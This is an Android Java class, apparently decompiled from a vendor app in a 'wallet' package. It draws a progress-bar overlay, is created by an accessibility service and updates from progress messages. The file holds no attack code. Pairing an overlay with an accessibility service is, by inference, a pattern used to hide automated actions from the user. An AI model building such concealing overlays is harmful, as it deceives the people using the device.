/**
 * 悬浮遮罩 View，Canvas 绘制半透明矩形
 * - 白色背景圆角条 + 蓝色进度条
 * - 通过 Handler.Callback 接收进度消息 (1~100)
 * - onLayout 时自动计算居中位置和尺寸
 *
 * vendor 原始路径: e0/f.java
 */
package com.guard.wallet.view;

import android.graphics.Canvas;
import android.graphics.Color;
import android.graphics.Paint;
import android.graphics.RectF;
import android.os.Handler;
import android.os.Looper;
import android.os.Message;
import android.view.View;
import com.guard.wallet.service.MyAccessibilityService;

public final class OverlayMaskView extends View implements Handler.Callback {
    public final Handler handler;
    public Paint bgPaint;
    public Paint fgPaint;
    public RectF bgRect;
    public RectF fgRect;
    public int progress = 0;
    public int barWidth = 380;
    public int barHeight = 14;

    public OverlayMaskView(MyAccessibilityService service) {
        super(service);
        Paint bg = new Paint();
        this.bgPaint = bg;
        bg.setColor(-1);
        this.bgPaint.setAntiAlias(true);
        this.bgPaint.setStyle(Paint.Style.FILL);
        this.bgPaint.setStrokeWidth(0.0f);
        Paint fg = new Paint();
        this.fgPaint = fg;
        fg.setColor(Color.parseColor("#1677ff"));
        this.fgPaint.setAntiAlias(true);
        this.fgPaint.setStyle(Paint.Style.FILL);
        this.fgPaint.setStrokeWidth(0.0f);
        this.handler = new Handler(Looper.getMainLooper(), this);
    }

    @Override
    public final boolean handleMessage(Message msg) {
        int what = msg.what;
        if (what > 0 && what > this.progress && what <= 100) {
            this.progress = what;
            this.invalidate();
        }
        return false;
    }

    @Override
    public final void onDraw(Canvas canvas) {
        if (this.bgRect == null) {
            RectF rect = new RectF();
            this.bgRect = rect;
            rect.set(0.0f, 0.0f, (float) this.barWidth, (float) this.barHeight);
        }
        if (this.fgRect == null) {
            this.fgRect = new RectF();
        }
        float ratio = (float) this.progress / 100.0f;
        RectF bg = this.bgRect;
        float left = bg.left;
        float top = bg.top;
        float right = bg.right;
        float bottom = bg.bottom;
        this.fgRect.set(left, top, (right - left) * ratio + left, bottom);
        canvas.drawRoundRect(this.bgRect, 100.0f, 100.0f, this.bgPaint);
        canvas.drawRoundRect(this.fgRect, 100.0f, 100.0f, this.fgPaint);
    }

    @Override
    public final void onLayout(boolean changed, int l, int t, int r, int b) {
        super.onLayout(changed, l, t, r, b);
        if (this.bgRect == null) {
            RectF rect = new RectF();
            this.bgRect = rect;
            int width = r - l;
            int height = b - t;
            int computedBarWidth = (int) ((float) width * 0.4f);
            this.barWidth = computedBarWidth;
            float offsetX = (float) (width - computedBarWidth) / 2.0f;
            float offsetY;
            if (height >= this.barHeight) {
                offsetY = (float) (height - this.barHeight) / 2.0f;
            } else {
                this.barHeight = height;
                offsetY = 0.0f;
            }
            rect.set(offsetX, offsetY, (float) computedBarWidth + offsetX, (float) this.barHeight + offsetY);
        }
    }

    @Override
    public final void onMeasure(int widthMeasureSpec, int heightMeasureSpec) {
        super.onMeasure(widthMeasureSpec, heightMeasureSpec);
    }
}
